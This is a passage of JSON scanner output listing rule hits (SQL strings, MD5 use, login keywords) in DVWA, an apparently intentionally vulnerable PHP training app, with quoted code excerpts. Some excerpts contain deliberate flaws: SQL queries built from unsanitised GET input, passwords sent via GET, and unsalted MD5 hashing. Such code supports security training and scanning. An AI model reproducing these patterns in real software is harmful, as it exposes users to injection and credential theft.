        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39; );",
        "excerpt": "\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;\n\n\t\t// Update bad login count\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\t}\n\n\t// Set the last login time\n",
        "startLocationLine": 88,
        "startLocationColumn": 25,
        "endLocationLine": 88,
        "endLocationColumn": 111
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#39; );",
        "excerpt": "\t}\n\n\t// Set the last login time\n\t$data = $db-&gt;prepare( &#39;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );\n\t$data-&gt;execute();\n}\n\n// Generate Anti-CSRF token\n",
        "startLocationLine": 94,
        "startLocationColumn": 24,
        "endLocationLine": 94,
        "endLocationColumn": 95
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t$pass = $_POST[ &#39;password&#39; ];\n\t$pass = stripslashes( $pass );\n\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass = md5( $pass );\n\n\t// Default values\n\t$total_failed_login = 3;\n\t$lockout_time       = 15;\n\t$account_locked     = false;\n",
        "startLocationLine": 16,
        "startLocationColumn": 10,
        "endLocationLine": 16,
        "endLocationColumn": 13
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "&lt;?php\n\nif( isset( $_GET[ &#39;Login&#39; ] ) ) {\n\t// Sanitise username input\n\t$user = $_GET[ &#39;username&#39; ];\n\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t// Sanitise password input\n",
        "startLocationLine": 3,
        "startLocationColumn": 20,
        "endLocationLine": 3,
        "endLocationColumn": 25
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n\t\t$avatar = $row[&quot;avatar&quot;];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n",
        "startLocationLine": 20,
        "startLocationColumn": 4,
        "endLocationLine": 20,
        "endLocationColumn": 10
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n\t\t$avatar = $row[&quot;avatar&quot;];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n",
        "startLocationLine": 20,
        "startLocationColumn": 19,
        "endLocationLine": 20,
        "endLocationColumn": 25
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n\telse {\n\t\t// Login failed\n\t\tsleep( 2 );\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n",
        "startLocationLine": 24,
        "startLocationColumn": 26,
        "endLocationLine": 24,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;",
        "excerpt": "\t$pass = md5( $pass );\n\n\t// Check the database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n",
        "startLocationLine": 14,
        "startLocationColumn": 12,
        "endLocationLine": 14,
        "endLocationColumn": 82
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t// Sanitise password input\n\t$pass = $_GET[ &#39;password&#39; ];\n\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass = md5( $pass );\n\n\t// Check the database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n",
        "startLocationLine": 11,
        "startLocationColumn": 10,
        "endLocationLine": 11,
        "endLocationColumn": 13
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "&lt;?php\n\nif( isset( $_GET[ &#39;Login&#39; ] ) ) {\n\t// Get username\n\t$user = $_GET[ &#39;username&#39; ];\n\n\t// Get password\n\t$pass = $_GET[ &#39;password&#39; ];\n",
        "startLocationLine": 3,
        "startLocationColumn": 20,
        "endLocationLine": 3,
        "endLocationColumn": 25
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n\t\t$avatar = $row[&quot;avatar&quot;];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n",
        "startLocationLine": 18,
        "startLocationColumn": 4,
        "endLocationLine": 18,
        "endLocationColumn": 10
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n\t\t$avatar = $row[&quot;avatar&quot;];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n",
        "startLocationLine": 18,
        "startLocationColumn": 19,
        "endLocationLine": 18,
        "endLocationColumn": 25
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n\telse {\n\t\t// Login failed\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 22,
        "startLocationColumn": 26,
        "endLocationLine": 22,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;",
        "excerpt": "\t$pass = md5( $pass );\n\n\t// Check the database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n",
        "startLocationLine": 12,
        "startLocationColumn": 12,
        "endLocationLine": 12,
        "endLocationColumn": 82
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\n\t// Get password\n\t$pass = $_GET[ &#39;password&#39; ];\n\t$pass = md5( $pass );\n\n\t// Check the database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n",
        "startLocationLine": 9,
        "startLocationColumn": 10,
        "endLocationLine": 9,
        "endLocationColumn": 13
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/help/help.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "\t&lt;tr&gt;\n\t&lt;td&gt;&lt;div id=&quot;code&quot;&gt;\n\t\t&lt;h3&gt;About&lt;/h3&gt;\n\t\t&lt;p&gt;CSRF is an attack that forces an end user to execute unwanted actions on a web application in which they are currently authenticated.\n\t\t\tWith a little help of social engineering (such as sending a link via email/chat), an attacker may force the users of a web application to execute actions of\n\t\t\tthe attacker&#39;s choosing.&lt;/p&gt;\n\n\t\t&lt;p&gt;A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is\n\t\t\tthe administrator account, this can compromise the entire web application.&lt;/p&gt;\n",
        "startLocationLine": 9,
        "startLocationColumn": 125,
        "endLocationLine": 9,
        "endLocationColumn": 138
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/help/help.php",
        "ruleId": "AI016400",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "email",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "email",
        "excerpt": "\t&lt;td&gt;&lt;div id=&quot;code&quot;&gt;\n\t\t&lt;h3&gt;About&lt;/h3&gt;\n\t\t&lt;p&gt;CSRF is an attack that forces an end user to execute unwanted actions on a web application in which they are currently authenticated.\n\t\t\tWith a little help of social engineering (such as sending a link via email/chat), an attacker may force the users of a web application to execute actions of\n\t\t\tthe attacker&#39;s choosing.&lt;/p&gt;\n\n\t\t&lt;p&gt;A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is\n\t\t\tthe administrator account, this can compromise the entire web application.&lt;/p&gt;\n\n",
        "startLocationLine": 10,
        "startLocationColumn": 73,
        "endLocationLine": 10,
        "endLocationColumn": 78
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/high.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update the database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 18,
        "startLocationColumn": 13,
        "endLocationLine": 18,
        "endLocationColumn": 100
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/high.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\tif( $pass_new == $pass_conf ) {\n\t\t// They do!\n\t\t$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update the database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n",
        "startLocationLine": 15,
        "startLocationColumn": 15,
        "endLocationLine": 15,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );",
        "excerpt": "\t$pass_curr = md5( $pass_curr );\n\n\t// Check that the current password is correct\n\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\n\t// Do both new passwords match and does the current password match the user?\n",
        "startLocationLine": 18,
        "startLocationColumn": 24,
        "endLocationLine": 18,
        "endLocationColumn": 113
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database with new password\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\n\t\t// Feedback for the user\n",
        "startLocationLine": 31,
        "startLocationColumn": 25,
        "endLocationLine": 31,
        "endLocationColumn": 92
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t// Sanitise current password input\n\t$pass_curr = stripslashes( $pass_curr );\n\t$pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass_curr = md5( $pass_curr );\n\n\t// Check that the current password is correct\n\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n",
        "startLocationLine": 15,
        "startLocationColumn": 15,
        "endLocationLine": 15,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t\t// It does!\n\t\t$pass_new = stripslashes( $pass_new );\n\t\t$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database with new password\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n",
        "startLocationLine": 28,
        "startLocationColumn": 15,
        "endLocationLine": 28,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/medium.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;",
